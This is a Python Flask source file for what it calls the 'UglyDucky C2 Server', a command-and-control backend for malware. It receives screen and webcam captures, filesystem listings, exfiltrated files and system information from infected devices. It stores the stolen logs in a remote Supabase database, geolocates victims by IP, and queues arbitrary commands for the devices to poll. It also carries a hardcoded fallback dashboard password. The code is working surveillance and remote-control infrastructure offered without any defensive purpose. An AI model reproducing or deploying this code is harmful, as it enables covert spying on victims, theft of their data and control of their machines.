# File: c2_listener.py
import os
import json
import requests
from flask import Flask, request, jsonify
from datetime import datetime, timedelta, timezone

app = Flask(__name__)

# ==================================================================
# --- MANUAL CORS OVERRIDE (BYPASS FLASK-CORS) ---
# ==================================================================
@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Dashboard-Password, Accept'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS, PUT, DELETE'
    return response

# Catch all preflight OPTIONS requests directly and approve them
@app.route('/', defaults={'path': ''}, methods=['OPTIONS'])
@app.route('/<path:path>', methods=['OPTIONS'])
def handle_options(path):
    return '', 200

@app.errorhandler(Exception)
def handle_exception(e):
    return jsonify({"error": f"Backend Error: {str(e)}"}), 500
# ==================================================================

# Credentials from Render Environment Variables
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "ducky_admin_2024")

# --- IN-MEMORY CACHES ---
command_queue = {}
frame_cache = {}
filesystem_cache = {}
file_download_cache = {} 

def get_node_status(last_seen_str):
    if not last_seen_str: return "red", "Offline"
    try:
        last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
        now = datetime.now(timezone.utc)
        if now - last_seen < timedelta(minutes=2): return "green", "Online"
        if now - last_seen < timedelta(hours=1): return "yellow", "Idle"
    except ValueError: pass
    return "red", "Offline"

def geolocate_ip(ip):
    if not ip or ip.startswith("127.") or "Unknown" in ip: return 28.5383, -81.3792 
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.ok and response.json().get("status") == "success":
            return float(response.json().get("lat")), float(response.json().get("lon"))
    except: pass
    return 28.5383, -81.3792 

@app.route('/node/<device_id>', methods=['GET'])
def get_single_node(device_id):
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
        return jsonify({"error": "Unauthorized: Password mismatch"}), 401
    if not SUPABASE_KEY or not SUPABASE_URL:
        return jsonify({"error": "Missing SUPABASE_URL or SUPABASE_KEY in Render Vars!"}), 500

    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    try:
        time_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&select=created_at&order=created_at.desc&limit=1"
        response = requests.get(time_url, headers=headers, timeout=10)
        response.raise_for_status()
        device_data = response.json()

        if not device_data or not isinstance(device_data, list) or len(device_data) == 0:
            return jsonify({"error": f"Target ID '{device_id}' not found in Supabase database."}), 404

        last_seen = device_data[0].get('created_at', '')
        
        sysinfo_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&category=eq.System Info&select=content&limit=1"
        sysinfo_resp = requests.get(sysinfo_url, headers=headers, timeout=10)
        
        os_info, ip_info = "Windows (Assumed)", "Unknown IP"
        sys_data = sysinfo_resp.json() if sysinfo_resp.ok else []
        if sys_data and isinstance(sys_data, list) and len(sys_data) > 0:
            content = sys_data[0].get('content', '')
            for line in content.split('\n'):
                if line.startswith('Caption='): os_info = line.split('=')[-1].strip()
                elif line.startswith('PUBLIC IP:'): ip_info = line.split(':')[-1].strip()

        status_color, _ = get_node_status(last_seen)
        lat, lng = geolocate_ip(ip_info)
        
        return jsonify({"id": device_id, "os": os_info, "ip": ip_info, "lat": lat, "lng": lng, "status": status_color, "last_seen": last_seen})

    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Supabase Connection Failed: {str(e)}"}), 500

@app.route('/logs/<device_id>', methods=['GET'])
def get_logs(device_id):
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    try:
        response = requests.get(f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc", headers=headers, timeout=10)
        response.raise_for_status()
        return jsonify(response.json()), 200
    except Exception as e: return jsonify({"error": f"Database fetch failed: {str(e)}"}), 500

@app.route('/frames/<device_id>/<cache_key>', methods=['GET'])
def get_frame(device_id, cache_key):
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    frame = frame_cache.get(device_id, {}).get(cache_key)
    return jsonify({"frame": frame}), 200 if frame else 404

@app.route('/fs/<device_id>', methods=['GET'])
def get_fs_data(device_id):
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    json_str = filesystem_cache.pop(device_id, None) 
    if not json_str: return jsonify({"error": "No FS data"}), 404
    try: return jsonify(json.loads(json_str)), 200
    except Exception: return jsonify({"error": "Invalid format"}), 500

@app.route('/fs_download/<device_id>', methods=['GET'])
def get_fs_download(device_id):
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    json_data = file_download_cache.pop(device_id, None)
    if not json_data: return jsonify({"error": "File not ready"}), 404
    try: return jsonify(json.loads(json_data)), 200
    except Exception: return jsonify({"error": "Invalid format"}), 500

@app.route('/frames', methods=['POST'])
def push_frame():
    data = request.json
    device_id = data.get("device_id")
    if device_id not in frame_cache: frame_cache[device_id] = {}
    cache_key = f"{data.get('frame_type')}_{data.get('monitor_index', 0)}" if data.get('frame_type') == "screen" else "webcam"
    frame_cache[device_id][cache_key] = data.get("data")
    return jsonify({"status": "received"}), 200

@app.route('/logs', methods=['POST'])
def push_logs():
    data = request.json
    if data and data.get("category") == "filesystem_data":
        filesystem_cache[data.get("device_id")] = data.get("content")
        return jsonify({"status": "fs cached"}), 200
    if data and data.get("category") == "file_download_data":
        file_download_cache[data.get("device_id")] = data.get("content")
        return jsonify({"status": "dl cached"}), 200

    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Prefer": "return=minimal,resolution=merge-duplicates"}
    try:
        requests.post(f"{SUPABASE_URL}?on_conflict=device_id,category", json=data, headers=headers, timeout=15)
        return jsonify({"status": "success"}), 200
    except Exception as e: return jsonify({"error": f"DB push failed: {str(e)}"}), 500

@app.route('/issue', methods=['POST'])
def issue_command():
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    command_queue[request.json.get('device_id')] = request.json.get('command')
    return jsonify({"status": "command queued"}), 200

@app.route('/poll/<device_id>', methods=['GET'])
def poll_for_command(device_id):
    return jsonify({"command": command_queue.pop(device_id, None)})

@app.route('/')
def index(): 
    return "UglyDucky C2 Server is Online."

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
